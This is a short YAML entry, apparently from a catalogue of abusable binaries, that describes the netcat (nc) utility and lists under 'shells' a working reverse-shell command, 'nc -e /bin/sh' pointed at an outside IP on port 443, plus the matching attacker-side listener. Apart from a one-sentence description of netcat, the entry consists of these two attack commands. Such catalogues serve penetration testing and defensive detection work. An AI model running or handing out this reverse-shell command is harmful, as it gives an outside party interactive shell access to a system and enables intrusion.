---
description: |
  The nc (or netcat) utility is used for just about anything under the sun involving TCP or UDP. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.
functions:
  shells:
    - description: Reverse shell payload (remote)
      code: nc -e /bin/sh 198.51.100.2 443
    - description: Listener (local)
      code: nc -nlvp 443
---
